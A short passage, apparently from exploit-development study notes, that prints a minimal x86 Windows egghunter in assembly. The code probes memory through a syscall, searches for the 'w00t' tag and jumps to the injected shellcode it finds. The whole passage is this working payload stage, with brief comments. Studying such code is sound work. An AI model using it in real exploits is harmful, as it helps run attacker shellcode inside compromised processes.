### Whole Egghunter

Minimal version:

```txt
start:
    xor edx, edx              ; EDX = 0 (start scanning)

page_align:
    or dx, 0xfff              ; move to end of current page

next_page:
    inc edx                   ; move to start of next page

check_page:
    push edx
    push 0x2
    pop eax
    int 0x2e                  ; probe memory

    cmp al, 0x5               ; access violation?
    pop edx
    je page_align             ; if invalid → skip page

scan:
    mov eax, 0x74303077       ; "w00t"
    mov edi, edx

compare:
    scasd                     ; check first 4 bytes
    jne next_page

    scasd                     ; check second 4 bytes
    jne next_page

    jmp edi                   ; found → jump to shellcode
```